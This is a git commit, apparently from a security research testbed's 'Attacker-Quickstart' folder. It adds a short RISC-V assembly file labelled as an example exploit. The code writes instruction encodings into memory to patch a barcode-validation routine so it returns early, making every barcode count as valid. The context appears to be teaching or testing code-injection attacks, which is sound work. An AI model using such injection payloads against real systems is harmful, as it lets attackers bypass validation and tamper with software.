d62d2d20a2f1bcc8486a146b9bff7ad0ae9ae0b3
Annie Cherkaev <anniecherk@galois.com>
2019-08-07 17:59:04 -0700

    second example exploit

---
+++ Attacker-Quickstart/all-barcodes-are-valid/inject-return-0.asm
@@ -0,0 +1,10 @@
+lui     a0, 786471
+addi    a0, a0, -196
+sw      a0, -12(s0)
+lw      a0, -12(s0)
+addi    a1, zero, 1299
+sw      a1, 0(a0)
+lw      a0, -12(s0)
+lui     a1, 8
+addi    a1, a1, 103
+sw      a1, 4(a0)
